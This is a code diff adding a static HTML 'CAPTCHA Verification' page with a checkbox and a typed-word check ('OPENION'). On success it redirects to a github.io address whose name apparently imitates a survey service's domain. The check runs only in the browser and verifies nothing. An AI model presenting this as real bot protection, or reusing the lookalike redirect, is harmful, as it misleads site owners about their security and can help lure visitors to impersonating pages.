@@ -1,1 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CAPTCHA Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+      background-color: #f8f8f8;
+    }
+    h2 { color: #2c3e50; }
+    .captcha-box {
+      display: inline-block;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      margin-top: 20px;
+    }
+    input[type="text"] {
+      padding: 8px;
+      width: 200px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #3498db;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover { background: #2980b9; }
+  </style>
+</head>
+<body>
+  <h2>🔒 CAPTCHA Verification</h2>
+  <p>Please complete the challenge below to continue.</p>
 
+  <div class="captcha-box">
+    <label>
+      <input type="checkbox" id="humanCheck"> I am not a robot
+    </label>
+    <br><br>
+    <label for="captchaInput">Type the word <b>OPENION</b>:</label><br>
+    <input type="text" id="captchaInput" placeholder="Enter here">
+    <br>
+    <button onclick="verifyCaptcha()">Continue</button>
+  </div>
+
+  <script>
+    function verifyCaptcha() {
+      const checked = document.getElementById("humanCheck").checked;
+      const text = document.getElementById("captchaInput").value.trim().toUpperCase();
+
+      if (checked && text === "OPENION") {
+        // ✅ Redirect to your verification page
+        window.location.href = "https://samplicio-us-ai.github.io/verification.aspx/eyetracking/1002/";
+      } else {
+        alert("❌ Verification failed. Please try again.");
+      }
+    }
+  </script>
+</body>
+</html>
